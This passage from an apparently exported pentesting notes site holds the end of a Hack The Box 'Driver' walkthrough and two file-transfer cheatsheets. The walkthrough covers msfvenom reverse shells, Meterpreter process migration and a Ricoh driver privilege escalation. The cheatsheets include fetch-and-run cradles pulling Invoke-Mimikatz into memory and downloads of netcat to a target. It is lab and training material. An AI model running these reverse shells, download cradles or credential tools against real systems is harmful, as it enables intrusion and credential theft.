certificate (default is randomly generated)\n   URI        /wsman           yes       The URI of the WinRM service\n   URIPATH                     no        The URI to use for this exploit (default is random)\n   USERNAME   tony             yes       A specific username to authenticate as\n   VHOST                       no        HTTP server virtual host\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     tun1             yes       The listen address (an interface may be specified)\n   LPORT     9001             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows\n```   \n\n```bash\n[*] Started reverse TCP handler on 10.10.14.12:9001 \n[-] Login Failure. Recheck your credentials\n^C[*] Exploit completed, but no session was created.\n```\n\nAwww it doesn't work :(\n\nLet's go for `msfvenom` then :)\n\n```bash\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=9001 -f exe -o msf.exe                                                                                                                          5m 14s\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of exe file: 7168 bytes\nSaved as: msf.exe\n```\n\nWe then:\n\n```bash\nupload exes/msf.exe\n```\n\nGo to `msfconsole` and run the `exploit/multi/handler` on port 9001:\n\n```bash\nModule options (exploit/multi/handler):\n\n   Name  Current Setting  Required  Description\n   ----  ---------------  --------  -----------\n\n\nPayload options (generic/shell_reverse_tcp):\n\n   Name   Current Setting  Required  Description\n   ----   ---------------  --------  -----------\n   LHOST  10.10.14.12      yes       The listen address (an interface may be specified)\n   LPORT  9001             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Wildcard Target\n```\n\nIt worked!!!!\n\n```bash\n[msf](Jobs:0%20Agents:0) exploit(multi/handler) \u003e\u003e run\n\n[*] Started reverse TCP handler on 10.10.14.12:9001 \n[*] Sending stage (200774 bytes) to 10.10.11.106\n[*] Meterpreter session 1 opened (10.10.14.12:9001 -\u003e 10.10.11.106:49447) at 2022-07-17 20:09:12 +0100\n\n(Meterpreter 1)(C:\\programdata) \u003e\n```\n\nWe can background it then use the `ricoh_driver_privesc` exploit:\n\n```bash\nModule options (exploit/windows/local/ricoh_driver_privesc):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     tun1             yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows\n\n[msf](Jobs:0%20Agents:1) exploit(windows/local/ricoh_driver_privesc) \u003e\u003e run\n\n[*] Started reverse TCP handler on 10.10.14.12:4444 \n[*] Running automatic check (\"set AutoCheck false\" to disable)\n[+] The target appears to be vulnerable. Ricoh driver directory has full permissions\n[*] Adding printer UjgJTcrEG...\n```\n\nAnd nothing happens :/\n\nWe can try with 32-bits, we do:\n\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.12 LPORT=9001 -f exe -o msf32.exe      INT\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x86 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 354 bytes\nFinal size of exe file: 73802 bytes\nSaved as: msf32.exe\n```\n\nThen:\n\n```bash\n*Evil-WinRM* PS C:\\programdata\u003e upload exes/msf32.exe\n```\n\nWe listen in metasploit and run the file, don't forget to have the payload set for 32-bit not 64.\n\nWe then try our **RICOH** exploit again, but we still **hang**.\n\nLet's try making our shell interactive. We go back to session 1 and run `ps` to list the services:\n\n```bash\n(Meterpreter 1)(C:\\programdata) \u003e ps\n\nProcess List\n============\n\n PID   PPID  Name                     Arch  Session  User         Path\n ---   ----  ----                     ----  -------  ----         ----\n 0     0     [System Process]\n 4     0     System\n 264   4     smss.exe\n 340   332   csrss.exe\n 364   948   WUDFHost.exe\n 448   332   wininit.exe\n 456   440   csrss.exe\n 500   440   winlogon.exe\n 512   4660  msf32.exe                x86   0        DRIVER\\tony  C:\\ProgramData\\msf32.exe\n 564   448   services.exe\n 572   448   lsass.exe\n 656   564   svchost.exe\n 664   512   cmd.exe                  x86   0        DRIVER\\tony  C:\\Windows\\SysWOW64\\cmd.exe\n 704   564   svchost.exe\n 816   564   sedsvc.exe\n 820   564   svchost.exe\n 828   656   explorer.exe             x64   1        DRIVER\\tony  C:\\Windows\\explorer.exe\n 840   500   dwm.exe\n 860   564   svchost.exe\n 868   564   svchost.exe\n 948   564   svchost.exe\n 984   564   svchost.exe\n 1032  564   svchost.exe\n 1232  564   spoolsv.exe\n 1360  564   svchost.exe\n 1452  4660  himum.exe                x64   0        DRIVER\\tony  C:\\ProgramData\\himum.exe\n 1488  656   explorer.exe             x64   1        DRIVER\\tony  C:\\Windows\\explorer.exe\n 1564  564   svchost.exe\n 1592  564   svchost.exe\n 1616  564   svchost.exe\n 1624  564   VGAuthService.exe\n 1644  564   vm3dservice.exe\n 1720  564   svchost.exe\n 1728  564   vmtoolsd.exe\n 1820  1644  vm3dservice.exe\n 1836  1452  cmd.exe                  x64   0        DRIVER\\tony  C:\\Windows\\System32\\cmd.exe\n 2056  1452  cmd.exe                  x64   0        DRIVER\\tony  C:\\Windows\\System32\\cmd.exe\n 2076  820   cmd.exe                  x64   1        DRIVER\\tony  C:\\Windows\\System32\\cmd.exe\n 2176  656   explorer.exe             x64   1        DRIVER\\tony  C:\\Windows\\explorer.exe\n 2244  564   dllhost.exe\n 2292  820   taskhostw.exe            x64   1        DRIVER\\tony  C:\\Windows\\System32\\taskhostw.exe\n 2404  656   WmiPrvSE.exe\n 2500  2076  conhost.exe              x64   1        DRIVER\\tony  C:\\Windows\\System32\\conhost.exe\n 2508  1836  conhost.exe              x64   0        DRIVER\\tony  C:\\Windows\\System32\\conhost.exe\n 2540  564   msdtc.exe\n 2716  2076  PING.EXE                 x64   1        DRIVER\\tony  C:\\Windows\\System32\\PING.EXE\n 2764  2056  conhost.exe              x64   0        DRIVER\\tony  C:\\Windows\\System32\\conhost.exe\n 2768  564   SearchIndexer.exe\n 2932  564   svchost.exe\n 3036  664   conhost.exe              x64   0        DRIVER\\tony  C:\\Windows\\System32\\conhost.exe\n 3060  820   sihost.exe               x64   1        DRIVER\\tony  C:\\Windows\\System32\\sihost.exe\n 3284  3256  explorer.exe             x64   1        DRIVER\\tony  C:\\Windows\\explorer.exe\n 3344  656   RuntimeBroker.exe        x64   1        DRIVER\\tony  C:\\Windows\\System32\\RuntimeBroker.exe\n 3648  656   ShellExperienceHost.exe  x64   1        DRIVER\\tony  C:\\Windows\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe\n 3752  656   SearchUI.exe             x64   1        DRIVER\\tony  C:\\Windows\\SystemApps\\Microsoft.Windows.Cortana_cw5n1h2txyewy\\SearchUI.exe\n 3920  564   svchost.exe              x64   1        DRIVER\\tony  C:\\Windows\\System32\\svchost.exe\n 4172  564   svchost.exe\n 4660  656   wsmprovhost.exe          x64   0        DRIVER\\tony  C:\\Windows\\System32\\wsmprovhost.exe\n 4856  3284  vmtoolsd.exe             x64   1        DRIVER\\tony  C:\\Program Files\\VMware\\VMware Tools\\vmtoolsd.exe\n 4896  3284  OneDrive.exe             x86   1        DRIVER\\tony  C:\\Users\\tony\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\n```\n\nThe ones with *Session = 1* can interact with the Desktop, let's migrate to `OneDrive`.\n\n```bash\n(Meterpreter 5)(C:\\programdata) \u003e migrate 4896\n[*] Migrating from 4116 to 4896...\n[*] Migration completed successfully.\n(Meterpreter 5)(C:\\Windows\\system32) \u003e getpid\nCurrent pid: 4896\n```\n\nNow we try **RICOH** again:\n\n```bash\nmsf](Jobs:0 Agents:2) exploit(windows/local/ricoh_driver_privesc) \u003e\u003e options\n\nModule options (exploit/windows/local/ricoh_driver_privesc):\n\n   Name     Current Setting  Required  Description\n   ----     ---------------  --------  -----------\n   SESSION  1                yes       The session to run this module on\n\n\nPayload options (windows/x64/meterpreter/reverse_tcp):\n\n   Name      Current Setting  Required  Description\n   ----      ---------------  --------  -----------\n   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)\n   LHOST     tun1             yes       The listen address (an interface may be specified)\n   LPORT     4444             yes       The listen port\n\n\nExploit target:\n\n   Id  Name\n   --  ----\n   0   Windows\n\n\n[msf](Jobs:0%20Agents:2) exploit(windows/local/ricoh_driver_privesc) \u003e\u003e sessions -l\n\nActive sessions\n===============\n\n  Id  Name  Type                     Information           Connection\n  --  ----  ----                     -----------           ----------\n  3         meterpreter x86/windows  DRIVER\\tony @ DRIVER  10.10.14.12:9001 -\u003e 10.10.11.106:49450 (10.10.11.106)\n  5         meterpreter x86/windows  DRIVER\\tony @ DRIVER  10.10.14.12:9001 -\u003e 10.10.11.106:49452 (10.10.11.106)\n\n[msf](Jobs:0%20Agents:2) exploit(windows/local/ricoh_driver_privesc) \u003e\u003e set SESSION 5\nSESSION =\u003e 5\n[msf](Jobs:0%20Agents:2) exploit(windows/local/ricoh_driver_privesc) \u003e\u003e run\n\n[*] Started reverse TCP handler on 10.10.14.12:4444 \n[*] Running automatic check (\"set AutoCheck false\" to disable)\n[+] The target appears to be vulnerable. Ricoh driver directory has full permissions\n[*] Adding printer pqsAiaGG...\n[*] Sending stage (200774 bytes) to 10.10.11.106\n```\n\nWe `ctrl+c` and go to the session, it worked!!!\n\n```bash\n(Meterpreter 6)(C:\\Users\\Administrator\\Desktop) \u003e ls\nListing: C:\\Users\\Administrator\\Desktop\n=======================================\n\nMode              Size  Type  Last modified              Name\n----              ----  ----  -------------              ----\n100666/rw-rw-rw-  282   fil   2021-06-11 11:57:47 +0100  desktop.ini\n100444/r--r--r--  34    fil   2022-07-18 01:23:19 +0100  root.txt\n\n(Meterpreter 6)(C:\\Users\\Administrator\\Desktop) \u003e cat root.txt \n326e9952dcf20633ad8cab171735a2be\n```\n\n## Reference\n- IppSec - Driver ([Video](https://www.youtube.com/watch?v=N2ahkarb-zI\u0026t=634s))",
    "lastmodified": "2022-11-24T12:20:59.20115006Z",
    "tags": null
  },
  "/notes/general/htb-file-transfer-cheatsheet": {
    "title": "File Transfer Cheatsheet",
    "content": "# File Transfer Cheatsheet\n---\n| **Command** | **Description** |\n| --------------|-------------------|\n| `Invoke-WebRequest https://\u003csnip\u003e/PowerView.ps1 -OutFile PowerView.ps1` | Download a file with PowerShell |\n| `IEX (New-Object Net.WebClient).DownloadString('https://\u003csnip\u003e/Invoke-Mimikatz.ps1')`  | Execute a file in memory using PowerShell |\n| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64` | Upload a file with PowerShell |\n| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe` | Download a file using Bitsadmin |\n| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe` | Download a file using Certutil |\n| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh` | Download a file using Wget |\n| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh` | Download a file using cURL |\n| `php -r '$file = file_get_contents(\"https://\u003csnip\u003e/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'` | Download a file using PHP |\n| `scp C:\\Temp\\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip` | Upload a file using SCP |\n| `scp user@target:/tmp/mimikatz.exe C:\\Temp\\mimikatz.exe` | Download a file using SCP |\n| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile \"nc.exe\"` | Invoke-WebRequest using a Chrome User Agent |",
    "lastmodified": "2022-11-24T12:20:59.324791074Z",
    "tags": null
  },
  "/notes/general/htb-file-transfers": {
    "title": "File Transfers",
    "content": "# File Transfers\n---\n- Netcat ([here](notes/general/netcat.md))\n- RDP ([here](notes/general/rdp.md))\n- [File Encryption](notes/general/file-encryption.md)\n- [Nginx](notes/general/nginx.md)\n- [Living off the land](notes/general/lolbins.md)\n\n# Windows\n## Download Operations\n#### PowerShell Base64 Encode and Decode\nWe can encode a file to a base64 string, copy contents from the terminal and then perform the reverse operation, meaning decoding the file in the original content.\n\n```bash\nPietra@htb[/htb]$ md5sum id_rsa\n\n4e301756a07ded0a2dd6953abf015278  id_rsa\n```\n\n```bash\nPietra@htb[/htb]$ cat id_rsa |base64 -w 0;echo\n\nLS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\n```\n\nThen we copy it and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it:\n\n```powershell\nPS C:\\htb\u003e [IO.File]::WriteAllBytes(\"C:\\Users\\Public\\id_rsa\", [Convert]::FromBase64String(\"LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=\"))\n```\n\nFinally, we can confirm if the file was transferred successfully using the [Get-FileHash](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-filehash?view=powershell-7.2) cmdlet, which does the same thing that `md5sum` does.\n\n```powershell\nPS C:\\htb\u003e Get-FileHash C:\\Users\\Public\\id_rsa -Algorithm md5\n\nAlgorithm       Hash                                                                   Path\n---------       ----                                                                   ----\nMD5             4E301756A07DED0A2DD6953ABF015278                                       C:\\Users\\Public\\id_rsa\n```\n\nWhile this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.\n\n#### Downloading Files using PowerShell\n- DownloadFile method: we can specify the class name `Net.WebClient` and the method `DownloadFile` with the parameters corresponding to the URL of the target file to download and the output file name.\n\n```powershell\nPS C:\\htb\u003e # Example: (New-Object Net.WebClient).DownloadFile('\u003cTarget File URL\u003e','\u003cOutput File Name\u003e')\n\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\\Users\\Public\\Downloads\\PowerView.ps1')\n\nPS C:\\htb\u003e # Example: (New-Object Net.WebClient).DownloadFileAsync('\u003cTarget File URL\u003e','\u003cOutput File Name\u003e')\n\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'PowerViewAsync.ps1')\n```\n\n- Fileless Method: as we previously discussed, fileless attacks work by using some operating system functions to download the payload and execute it directly. PowerShell can also be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the [Invoke-Expression](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7.2) cmdlet or the alias `IEX`.\n\n```powershell\nPS C:\\htb\u003e IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')\n```\n\n`IEX` also accepts pipeline input.\n\n```powershell\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX\n```\n\n- Invoke-WebRequest: from PowerShell 3.0 onwards, the [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.2) cmdlet is also available, but it is noticeably slower at downloading files. You can use the aliases `iwr`, `curl`, and `wget` instead of the `Invoke-WebRequest` full name.\n\n```powershell\nPS C:\\htb\u003e Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1\n```\n\nHarmj0y has compiled an extensive list of PowerShell download cradles [here](https://gist.github.com/HarmJ0y/bb48307ffa663256e239). \n\n#### Setup Internet Explorer Error\n\n![image](https://academy.hackthebox.com/storage/modules/24/IE_settings.png)\n\nCan be bypassed using the parameter `-UseBasicParsing`:\n\n```powershell\nPS C:\\htb\u003e Invoke-WebRequest https://\u003cip\u003e/PowerView.ps1 | IEX\n\nInvoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.\nAt line:1 char:1\n+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException\n+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand\n\nPS C:\\htb\u003e Invoke-WebRequest https://\u003cip\u003e/PowerView.ps1 -UseBasicParsing | IEX\n```\n\n#### SMB Downloads\nThe Server Message Block protocol (SMB protocol) that runs on port TCP/445 is common in enterprise networks where Windows services are running. It enables applications and users to transfer files to and from remote servers.\n\nWe can use SMB to download files easily. We need to create an SMB server with [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.\n\n- Create the server:\n```shell\nPietra@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\n- Copy file from SMB server:\n```cmd\nC:\\htb\u003e copy \\\\192.168.220.133\\share\\nc.exe\n\n        1 file(s) copied.\n```\n\nIn this case:\n\n```cmd\nC:\\htb\u003e copy \\\\192.168.220.133\\share\\nc.exe\n\nYou can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.\n```\n\nWe can set the username and password using the Impacket SMB server and mount it on our windows target machine:\n\n1. Create the SMB server with a username and password:\n```shell\nPietra@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test\n\nImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n```\n\n2. Mount the SMB Server with username and password:\n\n```cmd\nC:\\htb\u003e net use n: \\\\192.168.220.133\\share /user:test test\n\nThe command completed successfully.\n\nC:\\htb\u003e copy n:\\nc.exe\n        1 file(s) copied.\n```\n\n#### FTP Downloads\nAnother way to transfer files is using FTP (File Transfer Protocol), which use port TCP/21 and TCP/20. We can use the FTP client or PowerShell Net.WebClient to download files from an FTP server.\n\nWe can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. It can be installed with the following command:\n\n- Installing the FTP Server Python3 Module - pyftpdlib\n\n```shell\nPietra@htb[/htb]$ sudo pip3 install pyftpdlib\n```\n\nThen we can specify port number 21 because, by default, `pyftpdlib` uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.\n\n- Setting up a Python3 FTP Server\n\n```shell\nPietra@htb[/htb]$ sudo python3 -m pyftpdlib --port 21\n\n[I 2022-05-17 10:09:19] concurrency model: async\n[I 2022-05-17 10:09:19] masquerade (NAT) address: None\n[I 2022-05-17 10:09:19] passive ports: None\n[I 2022-05-17 10:09:19] \u003e\u003e\u003e starting FTP server on 0.0.0.0:21, pid=3210 \u003c\u003c\u003c\n```\n\nAfter the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell `Net.WebClient`.\n\n- Transferring Files from an FTP Server Using PowerShell\n\n```powershell\nPS C:\\htb\u003e (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'ftp-file.txt')\n```\n\nWhen we get a shell on a remote machine, we may not have an interactive shell. If that's the case, we can create an FTP command file to download a file. First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.\n\n- Create a Command File for the FTP Client and Download the Target File\n\n```cmd\nC:\\htb\u003e echo open 192.168.49.128 \u003e ftpcommand.txt\nC:\\htb\u003e echo USER anonymous \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo binary \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo GET file.txt \u003e\u003e ftpcommand.txt\nC:\\htb\u003e echo bye \u003e\u003e ftpcommand.txt\nC:\\htb\u003e ftp -v -n -s:ftpcommand.txt\nftp\u003e open 192.168.49.128\nLog in with USER and PASS first.\nftp\u003e USER anonymous\n\nftp\u003e GET file.txt\nftp\u003e bye\n\nC:\\htb\u003emore file.txt\nThis is a test file\n```\n\n## Upload Operations\n#### PowerShell Base64 Encode and Decode\n- Encode using PowerShell:\n\n```powershell\nPS C:\\htb\u003e [Convert]::ToBase64String((Get-Content -path \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Encoding byte))\n\nIyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=\nPS C:\\htb\u003e Get-FileHash \"C:\\Windows\\system32\\drivers\\etc\\hosts\" -Algorithm MD5 | select Hash\n\nHash\n----\n3688374325B992DEF12793500307566D\n```\n\nWe copy this content and paste it into our attack host, use the `base64` command to decode it, and use the `md5sum` application to confirm the transfer happened correctly.\n\n- Decode Base64 String in Linux:\n\n```shell\nPietra@htb[/htb]$ echo 